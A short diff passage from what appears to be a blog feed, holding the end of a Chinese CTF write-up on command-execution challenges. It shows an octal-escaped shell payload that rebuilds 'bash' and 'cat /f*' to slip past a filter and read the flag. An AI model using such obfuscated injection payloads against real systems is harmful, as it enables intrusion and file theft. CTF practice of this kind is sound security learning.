-<p>但是正如常用的<code>bash&lt;&lt;&lt;...</code>这道题还可以尝试构造<code>bash</code>，如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#x27;\142\141\163\150&#x27;&lt;&lt;&lt;$&#x27;\143\141\164\40\57\146\52&#x27;</span><br></pre></td></tr></table></figure>
-
-<p>也可以成功读到flag。</p>
-<p>注意知识点的融汇贯通。</p>
-<p>其他的题可以看看</p>
-<p><a href="https://ctf-show.feishu.cn/docx/EH72dMi3hoBtLJxDydjcIVcQnSc">CTFshow-周末大挑战官方wp</a></p>
-]]></content>
-      <categories>
-        <category>rce</category>
-        <category>rce之利用shell变量</category>
       </categories>
   </entry>
   <entry>
